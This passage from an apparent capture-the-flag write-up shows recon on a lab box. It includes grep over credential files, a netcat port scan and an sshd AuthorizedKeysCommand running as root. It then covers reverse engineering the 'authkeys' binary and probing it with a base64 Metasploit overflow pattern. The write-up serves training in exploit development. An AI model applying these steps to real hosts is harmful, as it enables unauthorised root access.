grep: /etc/examples/ripd.conf: Permission denied
grep: /etc/examples/sasyncd.conf: Permission denied
grep: /etc/examples/snmpd.conf: Permission denied
grep: /etc/examples/vm.conf: Permission denied
grep: /etc/examples/ypldap.conf: Permission denied
grep: /etc/mtree/special: Permission denied
grep: /etc/npppd/npppd-users: Permission denied
grep: /etc/npppd/npppd.conf: Permission denied
grep: /etc/ppp/chatscript.sample: Permission denied
grep: /etc/ppp/options.sample: Permission denied
grep: /etc/ppp/chap-secrets: Permission denied
grep: /etc/ppp/options: Permission denied
grep: /etc/ppp/pap-secrets: Permission denied
/etc/ssh/sshd_config:94:#AuthorizedKeysCommand /usr/local/sbin/authkeys %f %h %t %k
grep: /etc/ssh/ssh_host_rsa_key: Permission denied
grep: /etc/ssh/ssh_host_dsa_key: Permission denied
grep: /etc/ssh/ssh_host_ecdsa_key: Permission denied
grep: /etc/ssh/ssh_host_ed25519_key: Permission denied
grep: /etc/master.passwd: Permission denied
grep: /etc/pf.conf: Permission denied
grep: /etc/spwd.db: Permission denied
grep: /etc/hostname.vio0: Permission denied
grep: /etc/random.seed: Permission denied
grep: /etc/soii.key: Permission denied
```

Yes one hit in sshd_config. Let´s examine that file further.

```ini
attended$ cat /etc/ssh/sshd_config
#       $OpenBSD: sshd_config,v 1.103 2018/04/09 20:41:22 tj Exp $

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

#Port 22
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

#HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key

# Ciphers and keying
#RekeyLimit default none

# Logging
#SyslogFacility AUTH
#LogLevel INFO

# Authentication:

#LoginGraceTime 2m
#PermitRootLogin prohibit-password
#StrictModes yes
#MaxAuthTries 6
#MaxSessions 10

#PubkeyAuthentication yes

# The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2
# but this is overridden so installations will only check .ssh/authorized_keys
AuthorizedKeysFile      .ssh/authorized_keys

#AuthorizedPrincipalsFile none

#AuthorizedKeysCommand none
#AuthorizedKeysCommandUser nobody

# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts
#HostbasedAuthentication no
# Change to yes if you don't trust ~/.ssh/known_hosts for
# HostbasedAuthentication
#IgnoreUserKnownHosts no
# Don't read the user's ~/.rhosts and ~/.shosts files
#IgnoreRhosts yes

# To disable tunneled clear text passwords, change to no here!
#PasswordAuthentication yes
#PermitEmptyPasswords no

# Change to no to disable s/key passwords
#ChallengeResponseAuthentication yes

#AllowAgentForwarding yes
#AllowTcpForwarding yes
#GatewayPorts no
#X11Forwarding no
#X11DisplayOffset 10
#X11UseLocalhost yes
#PermitTTY yes
#PrintMotd yes
#PrintLastLog yes
#TCPKeepAlive yes
#PermitUserEnvironment no
#Compression delayed
#ClientAliveInterval 0
#ClientAliveCountMax 3
#UseDNS no
#PidFile /var/run/sshd.pid
#MaxStartups 10:30:100
#PermitTunnel no
#ChrootDirectory none
#VersionAddendum none

# no default banner path
#Banner none

# override default of no subsystems
Subsystem       sftp    /usr/libexec/sftp-server

# Example of overriding settings on a per-user basis
#Match User anoncvs
#       X11Forwarding no
#       AllowTcpForwarding no
#       PermitTTY no
#       ForceCommand cvs server
#AuthorizedKeysCommand /usr/local/sbin/authkeys %f %h %t %k
#AuthorizedKeysCommandUser root
```

Yes it´s there seems to be some kind of configuration for sshd that is using authkeys and it´s running as user root... NIIICE. Well it´s commented out but that prestty much makes sense if we remember what was said in the notes, it´s only activated on the attendedgw. Let´s see what we can find about the AutorizedKeysCommand and AuthorizedKeysUser inside the man pages for sshd.

```man
AuthorizedKeysCommand

Specifies a program to be used to look up the user's public keys. The program must be owned by root, not writable by group or others and specified by an absolute path. Arguments to AuthorizedKeysCommand accept the tokens described in the TOKENS section. If no arguments are specified then the username of the target user is used.
The program should produce on standard output zero or more lines of authorized_keys output (see AUTHORIZED_KEYS in sshd(8)). AuthorizedKeysCommand is tried after the usual AuthorizedKeysFile files and will not be executed if a matching key is found there. By default, no AuthorizedKeysCommand is run.

AuthorizedKeysCommandUser

Specifies the user under whose account the AuthorizedKeysCommand is run. It is recommended to use a dedicated user that has no other role on the host than running authorized keys commands. If AuthorizedKeysCommand is specified but AuthorizedKeysCommandUser is not, then sshd(8) will refuse to start.


TOKENS

Arguments to some keywords can make use of tokens, which are expanded at runtime:

%%  A literal ‘%’.
%D  The routing domain in which the incoming connection was received.
%F  The fingerprint of the CA key.
%f  The fingerprint of the key or certificate.
%h  The home directory of the user.
%i  The key ID in the certificate.
%K  The base64-encoded CA key.
%k  The base64-encoded key or certificate for authentication.
%s  The serial number of the certificate.
%T  The type of the CA key.
%t  The key or certificate type.
%U  The numeric user ID of the target user.
%u  The username.

AuthorizedKeysCommand accepts the tokens %%, %f, %h, %k, %t, %U, and %u.
```

Ok seems like AuthorzedKeysCommand is kind of a plugin if you want to apply your own authentication mechanism. The program should return one or more lines with public keys to the caller. So I guess if we could exploit the program and return a valid public key for our private key we can login as root. This looks like a promising attack vector. Let´s just try to connect to attendedgw just to see that it works.

```
attended$ ssh attendedgw
ssh: connect to host attendedgw port 22: Connection refused
```

Well it doesn´t. :( There´s no nmap available here but netcat is installed so let´s just do a quick portscan.

```shell
attended$ nc -w 1 -zv attendedgw 15-3000 2>&1 | grep succeeded
Connection to attendedgw 25 port [tcp/smtp] succeeded!
Connection to attendedgw 53 port [tcp/domain] succeeded!
Connection to attendedgw 80 port [tcp/www] succeeded!
Connection to attendedgw 2222 port [tcp/*] succeeded!
```

Ok something unknown is answering at port 2222. We try to to connect.

```shell
attended$ ssh attendedgw -p 2222
freshness@attendedgw's password:
```

Hell yes sshd is answering there. Now we know where we can connect and that authkeys is probably being called on the other side. Let´s start analysing the binary and see if we can find some vulnarabilities.

## Exploiting the binary authkeys
So we now know that the binary authkeys runs on the attendedgw and will be called when we try to login with ssh. If we are going to find a vulnerability and exploit that we will need our own environment where we can develop and debug our exploit. So let´s get started.

### Mirroring the target environment
First of all we must find out what version of OpenBSD we are dealing with here Let´s run this command:

```shell
attended$ uname -a
OpenBSD attended.htb 6.5 GENERIC#13 amd64
attended$
```

Okay it´s version 6.5. Afters some googleing I found the installation media here https://cdn.openbsd.org/pub/OpenBSD/6.5/amd64/install65.iso I downloaded it and set up a virtual machine. I used both VMWare Fusion on my MacBook Pro and Hyper-V on my stationary Windows based hacking computer. Both worked just fine. Just do a simple insatllation and add packages as needed.

```shell
┌──(root💀c974b36640ee)-[/]
└─# ssh -i id_rsa root@172.16.175.3 
root@172.16.175.3's password: 
Last login: Wed Feb 17 13:58:06 2021 from 172.16.175.1
OpenBSD 6.5 (GENERIC.MP) #3: Sat Apr 13 14:48:43 MDT 2019

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

foo#                                                                                               
```

GDB is intalled right from the start but we need Python2 aswell, use pkg_add to add tools as needed https://man.openbsd.org/pkg_add.1 We do now have a good enough mirror to start working and find a vulnerability.

### Configure sshd to use authkeys

We now need to know exactly how the arguments that are sent into authkeys look like (%f %h %t %k). Instead of reading a ton of documents and still be guessing we can write a script that we put between sshd and authkeys. That script could then log the parameters coming in so we know exactly what we are dealing with here. This is what the script could look like:

```shell
#!/bin/sh 
touch /tmp/authkeys.log
echo $@ > /tmp/authkeys.log
/usr/local/sbin/authkeys $1 $2 $3 $4
```

Name that script authkeys.sh and place it in /usr/local/sbin, make sure you copy the binary authkeys to the same place. For sshd to be able to call this script it has to have certain permissions as stated in the sshd man. Let´s fix that:

```shell 
foo# chown root /usr/local/sbin/authkeys.sh                                                                                           
foo# chmod 755 /usr/local/sbin/authkeys.sh 
```

Now we are ready to configure ssh to call our script and make a config that closely mirrors that of the target: i changed /etc/ssh/sshd_config to this:


```config
#	$OpenBSD: sshd_config,v 1.103 2018/04/09 20:41:22 tj Exp $

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

#Port 22
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

#HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key

# Ciphers and keying
#RekeyLimit default none

# Logging
SyslogFacility AUTH
LogLevel DEBUG3

# Authentication:

#LoginGraceTime 2m
PermitRootLogin yes
#StrictModes yes
#MaxAuthTries 6
#MaxSessions 10

PubkeyAuthentication yes

# The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2
# but this is overridden so installations will only check .ssh/authorized_keys
#AuthorizedKeysFile	.ssh/authorized_keys

#AuthorizedPrincipalsFile none

AuthorizedKeysCommand /usr/local/sbin/authkeys.sh %f %h %t %k
AuthorizedKeysCommandUser root

# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts
#HostbasedAuthentication no
# Change to yes if you don't trust ~/.ssh/known_hosts for
# HostbasedAuthentication
#IgnoreUserKnownHosts no
# Don't read the user's ~/.rhosts and ~/.shosts files
#IgnoreRhosts yes

# To disable tunneled clear text passwords, change to no here!
#PasswordAuthentication yes
#PermitEmptyPasswords no

# Change to no to disable s/key passwords
#ChallengeResponseAuthentication yes

#AllowAgentForwarding yes
#AllowTcpForwarding yes
#GatewayPorts no
#X11Forwarding no
#X11DisplayOffset 10
#X11UseLocalhost yes
#PermitTTY yes
#PrintMotd yes
#PrintLastLog yes
#TCPKeepAlive yes
#PermitUserEnvironment no
#Compression delayed
#ClientAliveInterval 0
#ClientAliveCountMax 3
#UseDNS no
#PidFile /var/run/sshd.pid
#MaxStartups 10:30:100
#PermitTunnel no
#ChrootDirectory none
#VersionAddendum none

# no default banner path
#Banner none

# override default of no subsystems
Subsystem	sftp	/usr/libexec/sftp-server

# Example of overriding settings on a per-user basis
#Match User anoncvs
#	X11Forwarding no
#	AllowTcpForwarding no
#	PermitTTY no
#	ForceCommand cvs server

```

Save the changes and restart sshd:

```shell
foo# rcctl restart sshd
sshd(ok)
sshd(ok)
foo# exit
Connection to 172.16.175.3 closed.
┌──(root💀c974b36640ee)-[/]
└─# 
```

Now let´s generate a key pair to send to our server:

```shell
┌──(root💀c974b36640ee)-[/]
└─# ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): ./id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in ./id_rsa
Your public key has been saved in ./id_rsa.pub
The key fingerprint is:
SHA256:bCYhcLxewQOJWyrjVlQYM4FoWjt+5iQ3yY0UvtxZCio root@c974b36640ee
The key's randomart image is:
+---[RSA 3072]----+
|. oBB=           |
|.oo=B +          |
|o..*.o.o         |
|+ =.=..o.        |
|.+.B O.+S        |
|Eo+ & =+         |
|.. B .           |
|    .            |
|                 |
+----[SHA256]-----+
```

I did not bother to copy the public key to OpenBSD since I wanted to mirror the target, but I that should probably have saved me som time cause I logged in and out hundreds of times. Now when we try to login with our key this attempt will hopefully be logged in /tmp/authkeys.log We will be refused to log in with our key but then prompted for password.

```shell
┌──(root💀c974b36640ee)-[/]
└─# ssh -i id_rsa root@172.16.175.3 
The authenticity of host '172.16.175.3 (172.16.175.3)' can't be established.
ECDSA key fingerprint is SHA256:Y2XSfha2RXZS7saaSy8wBWRGKZlMjfnNvlzGJcKZNOw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.16.175.3' (ECDSA) to the list of known hosts.
root@172.16.175.3's password: 
Last login: Wed Feb 17 13:19:44 2021 from 172.16.175.1
OpenBSD 6.5 (GENERIC.MP) #3: Sat Apr 13 14:48:43 MDT 2019

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

foo#
```

Nice we are logged in again let´s check the log file.


```shell
foo# cat /tmp/authkeys.log                                                                                                            
SHA256:bCYhcLxewQOJWyrjVlQYM4FoWjt+5iQ3yY0UvtxZCio /root ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCl0+qwM4wPRIbGv5nCqpe3CmqzsDytNiMSGoKwv2HJOuSJouhwNjq8lDyKcBfhKiTjhLrJtg4vHeiU/tW0tMxLrL/tgbzGADY9O1F9huawswYq3h0rC+3nAiWE84F4Dqp1iq1+FqubkyxPMuY468BjO7YSQUJw57/3vbY5taxZqQp/n7mE62n5NQmfu2j/jVem2fdJtKS7uhqeANEU3DBCEgblyP9H5XUb312/EpOG/zD/8O8c2FXQPvZuhzKXYDh/YFn46Vul7pORH/YLWKvc63bos/SAHgukMM6FpAaOJxRlIqxPpAKziBymsEGZwVDU4URGx9+/9Bt+qsAUWfgcG3AVvo/iGpg0CaVrswXT/vN3Woyg5mhkVBIuhXgRpu9EtID+8mNJLYnApz/M7Xz22Ldyds2nLB9EjX6Bx2G539Zj6OyfFGFmEpaAh3Da/ooaxiJR6vI5J1y9mm4jyog5mHEfpj5r2bNpbqUQ6RpbzA/IhJBH5FyaQDeIZS3mKZ8=
```

So according to the man we see the fingerprint of the key or certificate "SHA256:bCYhcLxewQOJWyrjVlQYM4FoWjt+5iQ3yY0UvtxZCio", the home directory of the user "/root", the key or certificate type "ssh-rsa", The base64-encoded key or certificate for authentication "AAAAB3NzaC1yc2EAAAADAQABAAABgQCl....". Yes that looks pretty accurate. Looking at all these parameters there seems to be only one we can control. I guess fingerprint and home directory are set by sshd on the server, the type of key is probably from a set list of types. Key is what we can pretty much control. 

It´s about time we get going to work on that binary!

### Analyzing the binary with Ghidra and Radare2

We need to check out the program and see whats happening inside. I loaded up this program in Ghidra but quickly realised that this is probably not written in C or C++ to begin with cause the listing looked like this:

```c
undefined  [16] entry(void)

{
  byte bVar2;
  ulong uVar1;
  long lVar4;
  ulong uVar5;
  ulong uVar6;
  ulong extraout_RDX;
  undefined8 extraout_RDX_00;
  long lVar7;
  char *pcVar8;
  undefined *puVar9;
  char *pcVar10;
  undefined1 *puVar11;
  undefined *puVar12;
  ulong uVar13;
  bool bVar14;
  byte bVar15;
  long in_stack_00000000;
  long in_stack_00000008;
  undefined auStack776 [768];
  code *pcStack8;
  char cVar3;
  
  bVar15 = 0;
  if (in_stack_00000000 != 5) {
    pcStack8 = (code *)0x4003c7;
    FUN_004003cf(1,&DAT_00601000,0x24);
    syscall();
    return CONCAT88(extraout_RDX_00,1);
  }
  pcStack8 = (code *)0x400256;
  FUN_0040037a();
  pcStack8 = (code *)0x400274;
  FUN_004003cf(1,&DAT_00601024,0x12);
  lVar7 = 0;
  lVar4 = 5;
  while (lVar4 = lVar4 + -1, lVar4 != 0) {
    while( true ) {
      pcVar8 = (char *)(in_stack_00000008 + lVar7);
      lVar7 = lVar7 + 1;
      bVar14 = *pcVar8 == '\0';
      if (bVar14) break;
      if (bVar14) goto LAB_00400291;
    }
  }
LAB_00400291:
  pcStack8 = (code *)0x400299;
  FUN_004002c4();
  pcVar8 = &DAT_00601036;
  pcStack8 = (code *)0x4002b7;
  FUN_004003cf(1,&DAT_00601036,0x47);
  pcStack8 = FUN_004002c4;
  FUN_004003cf(0);
  puVar12 = auStack776;
  puVar9 = auStack776;
  pcStack8 = (code *)extraout_RDX;
  FUN_00400385();
  uVar5 = 0;
  uVar1 = FUN_0040038c();
  uVar13 = 0;
  do {
    uVar1 = uVar1 & 0xffffffffffffff00;
    if (*pcVar8 == '\0') {
      puVar12 = puVar12 + -(long)puVar9;
      if ((undefined *)0x2ff < puVar12) {
        puVar12 = (undefined *)0x300;
      }
      puVar9 = auStack776;
      puVar11 = &DAT_006010c0;
      while (puVar12 != (undefined *)0x0) {
        puVar12 = puVar12 + -1;
        *puVar11 = *puVar9;
        puVar9 = puVar9 + (ulong)bVar15 * -2 + 1;
        puVar11 = puVar11 + (ulong)bVar15 * -2 + 1;
      }
      return ZEXT816(pcStack8) << 0x40;
    }
    uVar6 = CONCAT71((int7)(uVar5 >> 8),0x40);
    pcVar10 = &DAT_0060107d;
    do {
      if (uVar6 == 0) break;
      uVar6 = uVar6 - 1;
      cVar3 = *pcVar10;
      pcVar10 = pcVar10 + (ulong)bVar15 * -2 + 1;
    } while (*pcVar8 != cVar3);
    uVar5 = uVar6;
    if ((byte)uVar6 != 0) {
      uVar5 = uVar6 & 0xffffffffffffff00 | (ulong)(byte)(~(byte)uVar6 + 0x40);
      uVar13 = uVar13 << 6 | uVar5;
      cVar3 = (char)(uVar1 >> 8);
      bVar2 = cVar3 + 6;
      uVar1 = (ulong)bVar2 << 8;
      if (7 < bVar2) {
        bVar2 = cVar3 - 2;
        uVar1 = (ulong)bVar2 << 8;
        *puVar12 = (char)(uVar13 >> (bVar2 & 0x3f));
        puVar12 = puVar12 + 1;
        uVar5 = uVar6 & 0xffffffffffffff00;
      }
    }
    pcVar8 = pcVar8 + 1;
  } while( true );
}

```

At least for me that´s totally unbearable to read so i decided to jump straight in to the machine code. I used Radare2 to do a disassembly dump and get a first glimpse inside the binary. 

```asm
┌──(root💀c974b36640ee)-[/]
└─# radare2 -A authkeys 
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x00400240]> pdf
            ;-- section..text:
            ;-- rip:
/ 341: entry0 (int64_t arg_8h);
|           ; arg int64_t arg_8h @ rbp+0x8
|           0x00400240      4889e5         mov rbp, rsp                ; [01] -r-x section size 402 named .text
|           0x00400243      488b4d00       mov rcx, qword [rbp]
|           0x00400247      4883f905       cmp rcx, 5                  ; 5
|       ,=< 0x0040024b      0f8558010000   jne 0x4003a9
|       |   0x00400251      e824010000     call fcn.0040037a
|       |   0x00400256      b804000000     mov eax, 4
|       |   0x0040025b      bf01000000     mov edi, 1
|       |   0x00400260      48be24106000.  movabs rsi, 0x601024
|       |   0x0040026a      ba12000000     mov edx, 0x12               ; 18
|       |   0x0040026f      e85b010000     call 0x4003cf
|       |   0x00400274      488b7508       mov rsi, qword [arg_8h]
|       |   0x00400278      4831db         xor rbx, rbx
|       |   0x0040027b      4831c9         xor rcx, rcx
|       |   0x0040027e      b105           mov cl, 5
|       |   ; CODE XREF from entry0 @ 0x40028d
|      .--> 0x00400280      48ffc9         dec rcx
|     ,===< 0x00400283      740c           je 0x400291
|     |:|   ; CODE XREF from entry0 @ 0x40028f
|    .----> 0x00400285      8a041e         mov al, byte [rsi + rbx]
|    :|:|   0x00400288      48ffc3         inc rbx
|    :|:|   0x0040028b      3c00           cmp al, 0
|    :|`==< 0x0040028d      74f1           je 0x400280
|    `====< 0x0040028f      75f4           jne 0x400285
|     | |   ; CODE XREF from entry0 @ 0x400283
|     `---> 0x00400291      4801de         add rsi, rbx
|       |   0x00400294      e82b000000     call 0x4002c4
|       |   0x00400299      b804000000     mov eax, 4
|       |   0x0040029e      bf01000000     mov edi, 1
|       |   0x004002a3      48be36106000.  movabs rsi, 0x601036
|       |   0x004002ad      ba47000000     mov edx, 0x47               ; 'G' ; 71
|       |   0x004002b2      e818010000     call 0x4003cf
|       |   0x004002b7      b801000000     mov eax, 1
|       |   0x004002bc      4831ff         xor rdi, rdi
|       |   0x004002bf      e80b010000     call 0x4003cf
|       |   ; CALL XREF from entry0 @ 0x400294
|       |   0x004002c4      52             push rdx
|       |   0x004002c5      4881ec000300.  sub rsp, 0x300
|       |   0x004002cc      4989f0         mov r8, rsi
|       |   0x004002cf      4989f4         mov r12, rsi
|       |   0x004002d2      4989e1         mov r9, rsp
|       |   0x004002d5      4989e2         mov r10, rsp
|       |   0x004002d8      f8             clc
|       |   0x004002d9      e8a7000000     call fcn.00400385
|       |   0x004002de      4831c0         xor rax, rax
|       |   0x004002e1      4831c9         xor rcx, rcx
|       |   0x004002e4      4831d2         xor rdx, rdx
|       |   0x004002e7      e8a0000000     call fcn.0040038c
|       |   0x004002ec      4d31db         xor r11, r11
|       |   ; CODE XREF from entry0 @ 0x400330
|      .--> 0x004002ef      418a00         mov al, byte [r8]
|      :|   0x004002f2      84c0           test al, al
|     ,===< 0x004002f4      743c           je 0x400332
|     |:|   0x004002f6      b140           mov cl, 0x40                ; '@' ; 64
|     |:|   0x004002f8      48bf7d106000.  movabs rdi, 0x60107d
|     |:|   0x00400302      f2ae           repne scasb al, byte [rdi]
|     |:|   0x00400304      84c9           test cl, cl
|    ,====< 0x00400306      7425           je 0x40032d
|    ||:|   0x00400308      f6d1           not cl
|    ||:|   0x0040030a      80c140         add cl, 0x40                ; 64
|    ||:|   0x0040030d      49c1e306       shl r11, 6
|    ||:|   0x00400311      4909cb         or r11, rcx
|    ||:|   0x00400314      80c406         add ah, 6
|    ||:|   0x00400317      80fc08         cmp ah, 8                   ; 8
|   ,=====< 0x0040031a      7211           jb 0x40032d
|   |||:|   0x0040031c      80ec08         sub ah, 8
|   |||:|   0x0040031f      88e1           mov cl, ah
|   |||:|   0x00400321      4c89da         mov rdx, r11
|   |||:|   0x00400324      48d3ea         shr rdx, cl
|   |||:|   0x00400327      418811         mov byte [r9], dl
|   |||:|   0x0040032a      49ffc1         inc r9
|   |||:|   ; CODE XREFS from entry0 @ 0x400306, 0x40031a
|   ``----> 0x0040032d      49ffc0         inc r8
|     |`==< 0x00400330      ebbd           jmp 0x4002ef
|     | |   ; CODE XREF from entry0 @ 0x4002f4
|     `---> 0x00400332      4c89c8         mov rax, r9
|       |   0x00400335      4c29d0         sub rax, r10
|       |   0x00400338      483d00030000   cmp rax, 0x300              ; 768
|      ,==< 0x0040033e      7205           jb 0x400345
|      ||   0x00400340      b800030000     mov eax, 0x300              ; 768
|      ||   ; CODE XREF from entry0 @ 0x40033e
|      `--> 0x00400345      4889c1         mov rcx, rax
|       |   0x00400348      48bfc0106000.  movabs rdi, 0x6010c0
|       |   0x00400352      4889e6         mov rsi, rsp
|       |   0x00400355      f3a4           rep movsb byte [rdi], byte ptr [rsi]
|       |   0x00400357      4c89e6         mov rsi, r12
|       |   0x0040035a      4881c4000300.  add rsp, 0x300
|       |   0x00400361      4831c0         xor rax, rax
|       |   0x00400364      4831f6         xor rsi, rsi
|       |   0x00400367      4889f7         mov rdi, rsi
|       |   0x0040036a      5a             pop rdx
|       |   0x0040036b      c3             ret
        |   ; CALL XREF from fcn.0040038c @ 0x40038c
..
|       |   ; CODE XREF from fcn.0040038c @ 0x400391
       :|   ; CALL XREF from entry0 @ 0x400251
       :|   ; CALL XREF from entry0 @ 0x4002d9
      |:|   ; CALL XREF from entry0 @ 0x4002e7
      | |   ; CALL XREF from fcn.00400385 @ 0x400385
      | |   ; CODE XREF from fcn.00400385 @ 0x40038a
|       |   ; CODE XREF from entry0 @ 0x40024b
|       `-> 0x004003a9      b804000000     mov eax, 4
|           0x004003ae      bf01000000     mov edi, 1
|           0x004003b3      48be00106000.  movabs rsi, str.Too_bad__Wrong_number_of_arguments__nEvaluating_key..._nSorry__this_damn_thing_is_not_complete_yet._Ill_finish_asap__promise__nABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_ ; segment.LOAD2
|                                                                      ; 0x601000 ; "Too bad, Wrong number of arguments!\nEvaluating key...\nSorry, this damn thing is not complete yet. I'll finish asap, promise!\nABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\x90\x90\x90"
|           0x004003bd      ba24000000     mov edx, 0x24               ; '$' ; 36
|           0x004003c2      e808000000     call 0x4003cf
|           0x004003c7      b801000000     mov eax, 1
|           0x004003cc      4831ff         xor rdi, rdi
|           ; CALL XREFS from entry0 @ 0x40026f, 0x4002b2, 0x4002bf, 0x4003c2
|           0x004003cf      0f05           syscall
\           0x004003d1      c3             ret
```

I spent some time looking at the code and figured out a few things. First it was counting the arguments coming in to the program to make sure it´s the right argument. Then it looped through the arguments up until the last one. There it jumped in to a larger code block and a lot of jumping and subroutines made it hard to wollow what was happening. Though based on the analysis we did before we know that this is base64 encoded stuff and a good guess is that the code is a base64 decoder.

Let´s examine what security mechanisms we have to deal with here:

```shell
┌──(root💀c974b36640ee)-[/]
└─# checksec --file=authkeys  --verbose
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   No Symbols	  No	0		0		authkeys
```
Ok, seems that nothing is enabled? No RELRO, CANARY, NX or PIE. Well we can check if that is correct later. But now we need to find a vulnerability. Let´s target that argument key with some heavy data and see what happens, we create the classic metasploit patterna so we can calculate an offset later on. But let´s remember the data i supposed to be base64 encoded:

```shell
┌──(root💀c974b36640ee)-[/]
└─# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1024 | base64
QWEwQWExQWEyQWEzQWE0QWE1QWE2QWE3QWE4QWE5QWIwQWIxQWIyQWIzQWI0QWI1QWI2QWI3QWI4
QWI5QWMwQWMxQWMyQWMzQWM0QWM1QWM2QWM3QWM4QWM5QWQwQWQxQWQyQWQzQWQ0QWQ1QWQ2QWQ3
QWQ4QWQ5QWUwQWUxQWUyQWUzQWU0QWU1QWU2QWU3QWU4QWU5QWYwQWYxQWYyQWYzQWY0QWY1QWY2
QWY3QWY4QWY5QWcwQWcxQWcyQWczQWc0QWc1QWc2QWc3QWc4QWc5QWgwQWgxQWgyQWgzQWg0QWg1
QWg2QWg3QWg4QWg5QWkwQWkxQWkyQWkzQWk0QWk1QWk2QWk3QWk4QWk5QWowQWoxQWoyQWozQWo0
QWo1QWo2QWo3QWo4QWo5QWswQWsxQWsyQWszQWs0QWs1QWs2QWs3QWs4QWs5QWwwQWwxQWwyQWwz
QWw0QWw1QWw2QWw3QWw4QWw5QW0wQW0xQW0yQW0zQW00QW01QW02QW03QW04QW05QW4wQW4xQW4y
QW4zQW40QW41QW42QW43QW44QW45QW8wQW8xQW8yQW8zQW80QW81QW82QW83QW84QW85QXAwQXAx
QXAyQXAzQXA0QXA1QXA2QXA3QXA4QXA5QXEwQXExQXEyQXEzQXE0QXE1QXE2QXE3QXE4QXE5QXIw
QXIxQXIyQXIzQXI0QXI1QXI2QXI3QXI4QXI5QXMwQXMxQXMyQXMzQXM0QXM1QXM2QXM3QXM4QXM5
QXQwQXQxQXQyQXQzQXQ0QXQ1QXQ2QXQ3QXQ4QXQ5QXUwQXUxQXUyQXUzQXU0QXU1QXU2QXU3QXU4
QXU5QXYwQXYxQXYyQXYzQXY0QXY1QXY2QXY3QXY4QXY5QXcwQXcxQXcyQXczQXc0QXc1QXc2QXc3
QXc4QXc5QXgwQXgxQXgyQXgzQXg0QXg1QXg2QXg3QXg4QXg5QXkwQXkxQXkyQXkzQXk0QXk1QXk2
QXk3QXk4QXk5QXowQXoxQXoyQXozQXo0QXo1QXo2QXo3QXo4QXo5QmEwQmExQmEyQmEzQmE0QmE1
QmE2QmE3QmE4QmE5QmIwQmIxQmIyQmIzQmI0QmI1QmI2QmI3QmI4QmI5QmMwQmMxQmMyQmMzQmM0
QmM1QmM2QmM3QmM4QmM5QmQwQmQxQmQyQmQzQmQ0QmQ1QmQ2QmQ3QmQ4QmQ5QmUwQmUxQmUyQmUz
QmU0QmU1QmU2QmU3QmU4QmU5QmYwQmYxQmYyQmYzQmY0QmY1QmY2QmY3QmY4QmY5QmcwQmcxQmcy
QmczQmc0Qmc1Qmc2Qmc3Qmc4Qmc5QmgwQmgxQmgyQmgzQmg0Qmg1Qmg2Qmg3Qmg4Qmg5QmkwQgo=
```

Now lets take that data add the other parameters and call authkeys to see what happens.

```shell
